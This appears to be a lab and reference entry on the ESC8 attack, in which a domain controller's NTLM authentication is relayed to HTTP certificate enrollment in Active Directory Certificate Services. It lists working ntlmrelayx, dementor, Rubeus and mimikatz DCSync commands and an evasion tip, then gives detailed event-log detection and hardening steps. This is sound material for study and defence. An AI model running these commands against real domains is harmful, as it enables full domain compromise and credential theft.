name: PKI ESC8 — NTLM Relay to ADCS HTTP Enrollment
description: ESC8: Active Directory Certificate Services (ADCS) web enrollment is enabled and does not require HTTPS, making it vulnerable to NTLM relay. Combined with coercion (PrinterBug/Coercer), the DC's NTLM auth is relayed to the CA web interface, obtaining a DC certificate. The certificate is used to get a TGT as the DC account, enabling DCSync. Detection: Events 4886/4887 with template=DomainController but requester is the relay IP, not DC. Event 4768 with cert-based pre-authentication.
notes:
=== BACKGROUND ===
  ESC8 conditions:
    1. ADCS web enrollment interface is enabled (http://<CA>/certsrv)
    2. Web enrollment uses HTTP (not HTTPS) — allows NTLM relay
    3. NTLMRelayx can relay any inbound NTLM connection to the CA web form

  Combined with coercion:
    → Coerce DC to authenticate via PrinterBug/dementor
    → NTLMRelayx catches DC's NTLM auth and replays to CA
    → CA issues a DomainController certificate to DC's identity
    → Use certificate via Rubeus to get DC's TGT → perform DCSync

  Key difference from PrinterBug DCSync:
    → ESC8 issues a CERTIFICATE (persistent, valid for years)
    → Can be used offline, from any machine with CA trust
    → No LDAP/RPC needed for future exploitation

Lab:
  PKI server at <PKI_IP> — runs ADCS web enrollment on HTTP
  DC2 at <DC2_IP> — Print Spooler enabled, will be coerced
  Kali at <KALI_IP> — runs NTLMRelayx + dementor.py

=== ATTACK ===
# Terminal 1 (Kali): Start NTLMRelayx targeting ADCS web enrollment
impacket-ntlmrelayx -t http://<PKI_IP>/certsrv/default.asp --template DomainController -smb2support --adcs
  → --template DomainController: request DC template certificate on behalf of relayed auth
  → --adcs: parse and output the base64 certificate from ADCS response
  → Waits for incoming NTLM auth from any DC

# Terminal 2 (Kali): Coerce DC2 to connect to Kali
python3 ./dementor.py <KALI_IP> <DC2_IP> -u <USER> -d <DOMAIN> -p <PASSWORD>
  → DC2$ authenticates to Kali's SMB listener
  → NTLMRelayx intercepts and relays to ADCS web interface
  → Certificate is issued in the name of DC2$
  → Output in Terminal 1: base64 certificate string

# Terminal 3 (Windows — any domain-joined machine): Inject certificate
# Paste the base64 certificate from NTLMRelayx output
.\Rubeus.exe asktgt /user:DC2$ /ptt /certificate:<BASE64_CERTIFICATE>
  → Uses certificate for PKINIT — Rubeus requests TGT as DC2$
  → /ptt: inject ticket into session

# DCSync as DC2$ (using injected TGT)
mimikatz.exe
mimikatz # lsadump::dcsync /user:Administrator /domain:<DOMAIN>
  → DC2$'s TGT lets mimikatz impersonate a DC and replicate

=== DETECTION ===
Event 4886: 'Certificate Services received a certificate request'
  → On CA server
  → Requester IP = Kali/relay machine (NOT DC2's actual IP)
  → Requester account = DC2$ BUT coming from wrong IP
  → Template = DomainController (normal DC certs are auto-enrolled, not web-enrolled)
  → Alert: DomainController template + web enrollment (IIS) = suspicious

Event 4887: 'Certificate Services approved and delivered a certificate request'
  → Same as 4886 — shows template name and requester
  → Normal DC certs auto-enroll silently; web-enrolled DC certs = alert

Event 4768: Kerberos TGT request
  → Certificate-based pre-auth (pre-auth type = PKINIT)
  → DC account requesting TGT from unexpected IP = alert

Event 4624:
  → DC2$ logging on from Kali's IP (relay source)

Difference between normal and relay request:
  → Normal auto-enrollment: Certificate Services log shows DC$ from DC's IP
  → Relay: Certificate Services log shows DC$ from Kali's IP (relay source)
  → Filter: DomainController template + source_ip NOT in DC IP list → alert

=== PREVENTION ===
  → Enforce HTTPS for ADCS web enrollment (removes relay possibility)
  → Disable HTTP on IIS hosting certsrv
  → Enable Extended Protection for Authentication on IIS (blocks relay even on HTTPS)
  → Disable ADCS web enrollment if not needed (use auto-enrollment instead)
  → Disable Print Spooler on DCs (removes coercion vector)
  → Block outbound 445 from DCs to non-DC machines

examples.label: Start NTLMRelayx targeting ADCS web enrollment (Terminal 1)
Coerce DC to connect to Kali via PrinterBug (Terminal 2)
Get TGT as DC using relayed certificate (Rubeus PKINIT)
Check CA server events for suspicious DomainController template requests
Disable ADCS web enrollment HTTP on IIS

references.title: Microsoft - Enable EPA on IIS for ADCS

recommended.note: ESC1: request certificate with SAN as Administrator directly — no relay needed.
PrinterBug/dementor is the coercion method used to trigger the relay in ESC8.
After getting DC TGT via certificate, DCSync for full domain credential dump.

defense.why_it_works: ESC8 exists when the ADCS web-enrollment interface is reachable over HTTP (no HTTPS), which allows NTLM relay. A coerced DC's NTLM authentication is relayed to the CA web form, which issues a DomainController certificate for the DC's identity.
defense.prerequisites: ADCS web enrollment enabled over HTTP; a coercion vector (PrinterBug/Coercer) against a DC; an attacker relay host; any valid domain user.
defense.impact: A long-lived DomainController certificate usable via PKINIT to obtain the DC's TGT, enabling DCSync. Unlike relay-to-DCSync, the certificate is persistent (valid for years) and usable offline from any machine.
defense.detection: Events 4886/4887 on the CA showing template = DomainController but the requester IP is the relay host, not the DC (normal DC certs auto-enroll silently, never via web enrollment). Event 4768 with certificate-based (PKINIT) pre-auth from an unexpected IP; Event 4624 for DC$ from the relay IP.
defense.artifacts: 4886/4887 with DomainController template sourced from a non-DC IP; ntlmrelayx --adcs and dementor execution; a base64 certificate on the attacker host; Rubeus asktgt for DC$.
defense.prevention: Enforce HTTPS for ADCS web enrollment and disable HTTP on the certsrv IIS site; enable Extended Protection for Authentication on IIS; disable web enrollment entirely if unused; disable Print Spooler on DCs; block outbound 445 from DCs to non-DC hosts.
defense.misconfiguration: The MS-EFSRPC interface (LSARPC/EfsRpcOpenFileRaw) allows unauthenticated (or authenticated in older variants) callers to coerce a Windows machine into authenticating to an arbitrary host via NTLM. When combined with an ADCS web enrollment endpoint (http://CA/certsrv/) that does not require HTTPS or Extended Protection for Authentication (EPA), the relayed authentication can be used to request a certificate for the DC machine account — which can then be used to obtain a TGT and perform DCSync.
defense.vulnerable_config:
# ADCS web enrollment without EPA or HTTPS:
# URL reachable: http://CA01/certsrv/  (no HTTPS redirect)
# EPA (Extended Protection for Authentication) = NOT configured

# IIS applicationHost.config (vulnerable):
# <security><authentication><windowsAuthentication>
#   <extendedProtection tokenChecking="None" />
# </windowsAuthentication></authentication></security>

# MS-EFSRPC coercion: unauthenticated (pre-patch) or low-priv user can call:
# EfsRpcOpenFileRaw(\\attacker@443\share) -> DC authenticates outbound
defense.secure_config:
# Fix 1 — Enable EPA on ADCS web enrollment (IIS):
# IIS Manager -> certsrv site -> Authentication -> Windows Auth -> Providers
# Set Extended Protection to 'Required'
# OR via command:
Import-Module WebAdministration
Set-WebConfigurationProperty -Filter '//security/authentication/windowsAuthentication' \
    -Name extendedProtection -Value @{tokenChecking='Require'} -PSPath 'IIS:\\' -Location 'Default Web Site/certsrv'

# Fix 2 — Enable HTTPS only on certsrv:
New-WebBinding -Name 'Default Web Site' -Protocol https -Port 443
# Redirect HTTP to HTTPS

# Fix 3 — Patch MS-EFSRPC: KB5005413 (Aug 2021)
# Fix 4 — Enable SMB signing on all hosts (blocks NTLM relay)
# GPO: 'Microsoft network server: Digitally sign communications (always)' = Enabled
defense.evasion: Request the certificate once and use it for the TGT; delete the local .pfx/.pem after; ESC relays are noisy — trigger the coercion briefly.
